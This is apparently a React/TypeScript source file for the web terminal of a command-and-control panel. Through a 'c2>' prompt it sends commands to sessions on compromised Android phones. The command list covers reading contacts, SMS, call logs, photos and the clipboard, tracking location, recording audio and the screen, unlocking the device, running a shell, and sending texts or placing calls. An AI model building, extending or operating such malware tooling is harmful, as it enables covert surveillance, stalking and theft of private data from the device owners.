import { useEffect, useRef, useState } from "react";
import { toast } from "sonner";
import { runCmd } from "@/lib/api";
import { hhmmss } from "@/lib/format";
import { useConsole, type TermLine } from "@/state";
import { cn } from "@/lib/utils";
import { Input } from "@/components/ui/input";

const CMD_HINTS = ["sessions", "use", "ping", "id", "info", "perms", "apps", "contacts", "smsin", "notifs", "loc",
  "calllog", "photos", "log", "smslog", "shell", "ls", "startapp", "sms", "call", "rec", "screen", "tap", "swipe",
  "settext", "gaction", "wake", "sleep", "unlock", "vol", "clipset", "clipget", "torch", "vibrate", "fastpoll", "help"];

const HIST_KEY = "artermlist";

function lineCls(l: TermLine) {
  switch (l.kind) {
    case "cmd": return "text-foreground";
    case "sys": return "text-muted-foreground";
    case "ok": return "text-emerald-500";
    case "err": return "text-red-400";
  }
}

function Line({ l }: { l: TermLine }) {
  return (
    <div className={cn("whitespace-pre-wrap break-words leading-relaxed", lineCls(l))}>
      <span className="text-muted-foreground/50 mr-2">{hhmmss(l.ts)}</span>
      {l.kind === "cmd" && l.text}
      {l.kind !== "cmd" && (
        <>
          {l.tag && <span className="text-primary">{l.tag} </span>}
          {l.cmd && <span className="text-muted-foreground/60">[{l.cmd}]{"\n"}</span>}
          {l.text}
          {l.truncated && "\n… truncated"}
        </>
      )}
    </div>
  );
}

export default function TerminalView() {
  const { snapshot, activeSession, termLines, pushTerm, sseLive } = useConsole();
  const [value, setValue] = useState("");
  const [hist, setHist] = useState<string[]>(() => {
    try { return JSON.parse(localStorage.getItem(HIST_KEY) || "[]"); } catch { return []; }
  });
  const histIdx = useRef(-1);
  const inputRef = useRef<HTMLInputElement>(null);
  const feedRef = useRef<HTMLDivElement>(null);
  const cid = snapshot?.active ?? null;

  useEffect(() => { feedRef.current?.scrollTo({ top: feedRef.current.scrollHeight }); }, [termLines]);
  useEffect(() => { inputRef.current?.focus(); }, []);

  const hintMatch = value.trim().replace(/^\//, "");
  const hints = !hintMatch || hintMatch.includes(" ")
    ? []
    : CMD_HINTS.filter((c) => c.startsWith(hintMatch.toLowerCase())).slice(0, 12);

  const submit = async () => {
    const text = value.trim();
    setValue("");
    if (!text) return;
    const nextHist = [...hist, text].slice(-200);
    setHist(nextHist);
    localStorage.setItem(HIST_KEY, JSON.stringify(nextHist));
    histIdx.current = -1;

    const bare = text.replace(/^\//, "").toLowerCase();
    if (bare === "help" || bare === "?") {
      pushTerm({ kind: "sys", text: "full command reference lives in the CLI console — the web terminal supports: " + CMD_HINTS.join(", ") });
      return;
    }
    if (!cid) { pushTerm({ kind: "err", text: "no active session — pick one from the strip above" }); return; }
    pushTerm({ kind: "cmd", text });
    try {
      const r = await runCmd(text, cid);
      toast[r.ok ? "success" : "error"](`${r.cmd} → ${(r.result || "").split("\n")[0].slice(0, 60)}`);
    } catch (e) {
      pushTerm({ kind: "err", text: String(e instanceof Error ? e.message : e) });
    }
    // result arrives via the SSE feed (deduped)
  };

  const s = activeSession();

  return (
    <div className="rounded-lg border bg-[#070b11] text-[#c9d4e2] flex flex-col h-[calc(100vh-150px)] min-h-[420px] max-w-[1400px]">
      <div ref={feedRef} className="flex-1 overflow-y-auto p-4 font-mono text-xs space-y-0.5">
        {termLines.length === 0 && (
          <p className="text-muted-foreground/50">
            {sseLive ? "live feed connected" : "connecting…"} — type a command and press Enter. Results stream in live.
          </p>
        )}
        {termLines.map((l, i) => <Line key={i} l={l} />)}
      </div>
      <div className="relative border-t flex items-center px-3 py-2.5">
        {hints.length > 0 && (
          <div className="absolute bottom-full left-3 right-3 mb-1 flex flex-wrap gap-1.5 rounded-lg border bg-popover p-2 shadow-lg">
            {hints.map((h) => (
              <button
                key={h}
                className="rounded border px-2 py-0.5 font-mono text-[11px] text-primary hover:bg-accent cursor-pointer"
                onMouseDown={(e) => { e.preventDefault(); setValue("/" + h + " "); inputRef.current?.focus(); }}
              >
                /{h}
              </button>
            ))}
          </div>
        )}
        <span className="font-mono text-xs text-primary mr-2 whitespace-nowrap">
          c2{s ? <>:<span className="text-cyan-400">{s.tag}</span></> : null}&gt;
        </span>
        <Input
          ref={inputRef}
          value={value}
          onChange={(e) => setValue(e.target.value)}
          onKeyDown={(e) => {
            if (e.key === "Enter") submit();
            else if (e.key === "ArrowUp") {
              e.preventDefault();
              if (!hist.length) return;
              histIdx.current = Math.min(histIdx.current + 1, hist.length - 1);
              setValue(hist[hist.length - 1 - histIdx.current]);
            } else if (e.key === "ArrowDown") {
              e.preventDefault();
              histIdx.current = Math.max(histIdx.current - 1, -1);
              setValue(histIdx.current >= 0 ? hist[hist.length - 1 - histIdx.current] : "");
            } else if (e.key === "Escape") setValue("");
          }}
          placeholder="type a command — /help for the map"
          className="border-0 bg-transparent font-mono text-xs h-auto px-1 focus-visible:ring-0 shadow-none text-foreground"
          autoComplete="off"
          spellCheck={false}
        />
      </div>
    </div>
  );
}
